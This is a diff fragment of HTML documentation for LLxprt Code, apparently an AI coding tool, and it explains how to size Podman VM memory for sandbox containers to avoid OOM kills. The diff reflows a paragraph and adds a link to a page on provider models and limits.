+<p>If you set the container memory higher than the Podman VM memory, the container
+starts but the process gets OOM-killed (exit code 137) as soon as it tries to
+use more memory than the VM has available. LLxprt Code does not resize the
+Podman machine VM.</p>
 <p><strong>Check current VM memory</strong> (output is in MiB, e.g., 8192 = 8 GiB):</p>
 <pre><code class="language-bash">podman machine inspect --format '{{.Resources.Memory}}'
 </code></pre>
@@ -353,13 +1202,17 @@ podman machine stop &lt;machine-name&gt;
 podman machine set --memory 16384 &lt;machine-name&gt;
 podman machine start &lt;machine-name&gt;
 </code></pre>
-<p><strong>Sizing guidance:</strong> Set VM memory higher than your container memory limit to leave headroom for Podman VM overhead and any other processes running inside the VM. For example, if your sandbox profile uses <code>&quot;memory&quot;: &quot;8g&quot;</code>, set VM memory to at least 10–12 GB.</p>
+<p><strong>Sizing guidance:</strong> Set VM memory higher than your container memory limit to
+leave headroom for Podman VM overhead and any other processes running inside the
+VM. For example, if your sandbox profile uses <code>&quot;memory&quot;: &quot;8g&quot;</code>, set VM memory to
+at least 10–12 GB.</p>
 <h2>Related</h2>
 <ul>
 <li><a href="./cli/sandbox-profiles.html">Sandbox Profiles</a> — full profile reference</li>
 <li><a href="./tutorials/sandbox-setup.html">Sandbox Setup Tutorial</a> — step-by-step walkthrough</li>
 <li><a href="./cli/authentication.html">Authentication</a> — credential setup</li>
 <li><a href="./cli/profiles.html">Profiles</a> — model and load balancer profiles (separate from sandbox profiles)</li>
+<li><a href="./providers/models-and-limits.html">Provider Models and Limits</a> — mutable model and pricing reference</li>
 </ul>
 
           </div>
